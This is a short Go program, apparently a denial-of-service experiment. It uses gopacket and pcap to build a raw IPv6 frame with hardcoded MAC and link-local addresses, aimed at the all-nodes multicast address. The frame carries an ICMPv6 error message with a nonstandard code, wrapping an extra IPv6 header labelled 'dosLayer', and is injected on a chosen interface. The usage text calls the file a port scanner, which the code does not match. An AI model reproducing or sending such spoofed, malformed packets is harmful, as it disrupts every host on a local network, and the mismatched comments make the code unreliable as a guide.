package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"time"

	//Get gopacket module
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers" // creating the byte structure for the
	"github.com/google/gopacket/pcap"   // esay way to send a byte
)

var (
	snapshotLen int32 = 65535
	promiscuous       = false
	err         error
	timeout     = -1 * time.Second // show immediately
	handle      *pcap.Handle
	buffer      gopacket.SerializeBuffer
	options     gopacket.SerializeOptions
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("You missed Device Name")
		fmt.Println("Example: go run port_scaning.go your_device_name_to_scan")
		os.Exit(1)
	}
	deviceName := os.Args[1]

	// Open the device for capturing
	handle, err := pcap.OpenLive(deviceName, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal("Error openning device. ", err)
	}
	defer handle.Close()

	ethernetLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0x00, 0x00, 0x27, 0x51, 0x1c, 0x5c},
		DstMAC:       net.HardwareAddr{0x00, 0x00, 0x27, 0x24, 0xfd, 0x11},
		EthernetType: layers.EthernetTypeIPv6,
	}

	ipLayer := &layers.IPv6{
		Version:    6,
		SrcIP:      net.ParseIP("fe80::a00:27ff:fe51:1c5c"),
		DstIP:      net.ParseIP("ff02::1"),
		NextHeader: layers.IPProtocolICMPv6,
	}

	icmpLayer := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(1, 8),
	}

	icmpLayer.SetNetworkLayerForChecksum(ipLayer)

	dosLayer := &layers.IPv6{
		Version:    6,
		SrcIP:      net.ParseIP("fe80::a00:27ff:fe51:1c5c"),
		DstIP:      net.ParseIP("ff02::1"),
		NextHeader: layers.IPProtocolSCTP,
	}

	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// And create the packet with the layers
	buffer := gopacket.NewSerializeBuffer()

	gopacket.SerializeLayers(
		buffer,
		opts,
		ethernetLayer,
		ipLayer,
		icmpLayer,
		dosLayer,
	)
	outgoingPacket := buffer.Bytes()

	err = handle.WritePacketData(outgoingPacket)
	if err != nil {
		log.Fatal("Error sending packet to network device. ", err)
	}
}
